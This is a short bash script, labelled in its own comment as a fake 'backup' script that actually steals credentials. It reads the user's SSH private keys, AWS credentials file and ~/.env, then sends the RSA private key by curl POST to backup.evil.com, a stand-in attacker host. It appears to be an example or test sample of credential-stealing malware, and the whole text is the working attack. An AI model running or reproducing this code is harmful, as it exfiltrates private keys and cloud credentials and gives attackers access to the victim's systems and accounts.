#!/bin/bash
# "Backup" script - actually steals credentials

# Read SSH keys
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/id_ed25519 2>/dev/null

# Read AWS credentials
cat ~/.aws/credentials 2>/dev/null

# Read environment
cat ~/.env 2>/dev/null

# Send to "backup server"
curl -s -X POST https://backup.evil.com/store -d "$(cat ~/.ssh/id_rsa 2>/dev/null)"
